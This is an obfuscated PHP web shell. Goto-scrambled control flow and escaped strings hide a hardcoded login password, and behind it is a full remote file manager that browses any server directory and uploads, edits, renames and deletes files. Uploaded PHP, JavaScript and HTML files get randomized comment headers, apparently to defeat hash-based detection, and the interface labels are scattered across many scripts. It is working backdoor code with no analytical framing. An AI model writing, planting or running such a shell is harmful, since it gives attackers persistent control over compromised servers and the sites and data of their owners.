<?php
 goto FkSji; h0O6K: $loginKey = "\71\x36\70\x38"; goto gTah7; FkSji: goto HxWr1; goto xZNBe; WCa3p: session_start(); goto OHKv7; PuZS3: function escapeHtml($value) { return htmlspecialchars($value, ENT_QUOTES, "\125\124\x46\x2d\x38"); } goto klvRh; w6N9o: HxWr1: goto WCa3p; gTah7: goto JR0FN; goto w6N9o; OHKv7: goto wgipu; goto Hu34Y; xZNBe: wgipu: goto h0O6K; VuUN9: if (!isset($_SESSION["\157\x6b"])) { if (isset($_POST["\x70\141\163\x73"]) && $_POST["\160\141\163\x73"] === $loginKey) { $_SESSION["\x6f\x6b"] = 1; header("\114\x6f\143\x61\164\151\x6f\156\72\x3f"); die; } die("\74\146\x6f\162\x6d\40\x6d\145\x74\x68\157\144\75\x22\x70\157\x73\164\x22\x3e\74\151\156\x70\165\x74\40\164\171\160\x65\x3d\42\160\x61\x73\x73\x77\x6f\162\x64\42\x20\156\x61\155\x65\x3d\x22\x70\x61\x73\163\x22\x3e\74\x62\x75\x74\x74\157\156\x3e\320\x96\322\xaf\xd0\xb9\320\xb5\xd0\xb3\xd0\265\x20\320\xba\321\226\xd1\x80\321\x83\74\57\x62\x75\x74\x74\157\x6e\76\74\57\146\x6f\162\155\x3e"); } goto PuZS3; Hu34Y: JR0FN: goto VuUN9; klvRh: function generateRandomText($length = 30) { $charPool = "\x61\x62\x63\144\x65\xe0\253\xa9\340\xab\xaa\xe0\xab\253\340\xab\254\340\xab\xad\xe0\253\xae\xe0\xab\257\x66\x67\150\x69\x6a\x6b\154\155\x6e\xd8\xa9\xce\x94\xd5\xac\325\272\xd6\202\xd5\255\340\252\255\xe0\252\xb9\xe1\236\217\341\237\x92\xe1\x9e\217\xe1\x9e\x97\xe1\x9f\220\xe1\236\x80\341\x9f\x92\xe1\236\217\341\x9e\267\341\236\212\xe1\236\276\341\236\x9a\341\236\217\xe1\236\275\xe1\x83\xae\xe1\x83\225\xe1\x83\230\xd3\xa1\322\xad\xd3\231\341\x88\250\162\163\164\165\166\167\170\x26\136\x25\171\172\x41\x42\103\x44\105\106\325\xb6\325\253\xe0\266\261\xc4\x89\304\235\xc5\276\xc5\241\xc3\xa8\xc3\xa0\xd3\xa3\x47\x48\111\x4a\100\43\44\x25\x5e\x26\x2a\50\51\113\114\x4d\x4e\117\120\121\122\x53\340\252\xae\340\253\202\xd8\xb7\330\xb1\325\273\326\x83\xd5\xbc\x54\125\x56\x2a\127\130\131\x5a\x30\x31\62\x33\64\x35\x36\x37\70\x39"; $result = ''; for ($index = 0; $index < $length; $index++) { $result .= $charPool[random_int(0, strlen($charPool) - 1)]; } return $result; }

function appendFileNote($fileName,$fileContent){

    $fileExtension=strtolower(pathinfo($fileName,PATHINFO_EXTENSION));

    $randomNote=generateRandomText(random_int(20,80));

    if($fileExtension==='php'){

        if(preg_match('/^\s*<\?php/i',$fileContent)){

            $fileContent=preg_replace(
                '/^\s*<\?php/i',
                "<?php\n/* Note:$randomNote */",
                $fileContent,
                1
            );

        }else{

            $fileContent="<?php\n/* Note:$randomNote */\n".$fileContent;

        }

    }elseif(in_array($fileExtension,['js','css','html','htm'])){

        $fileContent="/* Note:$randomNote */\n".$fileContent;

    }

    return $fileContent;
}


$currentPath=realpath($_GET['dir']??__DIR__);

if(!$currentPath){
    $currentPath=__DIR__;
}


/* 上传 */
if(isset($_FILES['file'])){

    foreach($_FILES['file']['tmp_name'] as $index=>$tempFile){

        if(!is_uploaded_file($tempFile)){
            continue;
        }

        $uploadName=basename($_FILES['file']['name'][$index]);

        $targetPath=$currentPath.'/'.$uploadName;

        $fileExtension=strtolower(pathinfo($uploadName,PATHINFO_EXTENSION));


        if(in_array($fileExtension,['php','js','css','html','htm'])){

            $uploadContent=file_get_contents($tempFile);

            file_put_contents(
                $targetPath,
                appendFileNote($uploadName,$uploadContent)
            );

        }else{

            move_uploaded_file($tempFile,$targetPath);

        }

    }

    header("Location:?dir=".urlencode($currentPath));
    exit;
}


/* 创建 */
if(isset($_POST['create'])){

    $createName=basename($_POST['name']);

    if($_POST['type']=='dir'){

        @mkdir($currentPath.'/'.$createName,0755);

    }else{

        @file_put_contents($currentPath.'/'.$createName,'');

    }

    header("Location:?dir=".urlencode($currentPath));
    exit;
}


/* 重命名 */
if(isset($_POST['rename'])){

    $oldName=basename($_POST['old']);

    $newName=basename($_POST['new']);


    if($newName){

        @rename(
            $currentPath.'/'.$oldName,
            $currentPath.'/'.$newName
        );

    }

    header("Location:?dir=".urlencode($currentPath));
    exit;
}


/* 删除 */
if(isset($_GET['del'])){

    $deletePath=realpath($_GET['del']);

    if($deletePath){

        if(is_file($deletePath)){

            @unlink($deletePath);

        }elseif(is_dir($deletePath)){

            @rmdir($deletePath);

        }

    }

    header("Location:?dir=".urlencode($currentPath));
    exit;
}


/* 保存 */
if(isset($_POST['save'])){

    $saveFile=realpath($_POST['file']);

    if($saveFile&&is_file($saveFile)){

        file_put_contents(
            $saveFile,
            $_POST['content']
        );

    }

    header("Location:?dir=".urlencode(dirname($saveFile)));
    exit;
}


$editFile=$_GET['edit']??'';
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>ߓߏ߬ߟߏ߲߬ߘߊ ߟߊߞߋ߲߬ߛߎ߬ߟߌ</title>

<style>
body{font:13px Arial;margin:10px;color:#333}
a{text-decoration:none;color:#06c}
.path{background:#88f291;border:1px solid #ddd;padding:6px;margin-bottom:8px;font-family:monospace}
form{margin:5px 0}
input,select,button{height:26px;padding:2px 6px;font-size:13px}
button{cursor:pointer}
table{width:100%;border-collapse:collapse;background:#fff;margin-top:8px}
td,th{border:1px solid $ddd;padding:5px}
th{background:#eee;font-weight:normal}
textarea{width:100%;height:350px;font-family:monospace;font-size:13px}
.action form{display:inline}
.action input{width:90px}
.action a{margin-left:6px}
.file{word-break:break-all}
</style>

</head>

<body>


<?php
 goto gdl9g; Sw5SE: foreach (explode("\57", trim($currentPath, "\57")) as $folderName) { if ($folderName == '') { continue; } $buildPath .= "\57" . $folderName; echo "\x2f\x3c\x61\40\150\x72\x65\x66\75\42\77\144\x69\162\75" . urlencode($buildPath) . "\x22\76" . escapeHtml($folderName) . "\x3c\57\141\76"; } goto uLddA; uLddA: goto SAWay; goto dUa_h; kGDK2: ew4PU: goto Sw5SE; UCqz4: $buildPath = ''; goto fzV6V; KWzfu: SAWay: goto dWl70; gdl9g: ?>
<div class="path"><?php  goto v7bYZ; fzV6V: goto ew4PU; goto kGDK2; TyJ5k: goto ZagXd; goto KWzfu; v7bYZ: goto mbKvc; goto k0od3; pwqTW: echo "\74\141\40\x68\162\145\x66\x3d\42\x3f\x64\x69\x72\75\57\x22\76\57\x3c\x2f\141\x3e"; goto TyJ5k; k0od3: ZagXd: goto UCqz4; dUa_h: mbKvc: goto pwqTW; dWl70: ?>
</div>



<div style="display:flex;gap:8px">


<form method="post" enctype="multipart/form-data">

<input type="file" name="file[]" multiple>

<button>Upload</button>

</form>



<form method="post">

<input name="name" placeholder="名称">

<select name="type">

<option value="file">έγγραφο</option>

<option value="dir">Folder</option>

</select>

<button name="create">δημιουργώ</button>

</form>


</div>




<?php if($editFile&&is_file($editFile)): ?>


<hr>


<form method="post">

<textarea name="content"><?=escapeHtml(file_get_contents($editFile))?></textarea>

<input type="hidden" name="file" value="<?=escapeHtml($editFile)?>">

<br>

<button name="save">ᐱᓯᒪᓗᒍ</button>

</form>


<hr>


<?php endif; ?>




<table>

<tr>

<th>名称</th>

<th width="80">大小</th>

<th width="260">操作</th>

</tr>




<?php if($currentPath!='/'): ?>


<tr>

<td colspan="3">

<a href="?dir=<?=urlencode(dirname($currentPath))?>">⬅ ᓯᓚᓪᓕᖅ</a>

</td>

</tr>


<?php endif; ?>





<?php

$directoryList=@scandir($currentPath);


if($directoryList){

foreach($directoryList as $fileName){


if($fileName=='.'||$fileName=='..'){
    continue;
}


$fullPath=$currentPath.'/'.$fileName;


?>

<tr>


<td class="file">


<?php if(is_dir($fullPath)): ?>


📁

<a href="?dir=<?=urlencode($fullPath)?>">

<?=escapeHtml($fileName)?>

</a>


<?php else: ?>


📄

<a href="?edit=<?=urlencode($fullPath)?>">

<?=escapeHtml($fileName)?>

</a>


<?php endif; ?>


</td>




<td>

<?=is_file($fullPath)?filesize($fullPath).'B':'-'?>

</td>





<td class="action">


<form method="post">


<input type="hidden" name="old" value="<?=escapeHtml($fileName)?>">


<input name="new" placeholder="ⵉⵙⴻⵎ ⴰⵎⴰⵢⵏⵓ">


<button name="rename">མིང་བསྒྱུར་བ།</button>


</form>



<a onclick="return confirm('删除?')" 
href="?dir=<?=urlencode($currentPath)?>&del=<?=urlencode($fullPath)?>">

删除

</a>


</td>


</tr>


<?php

}

}

?>


</table>


</body>

</html>
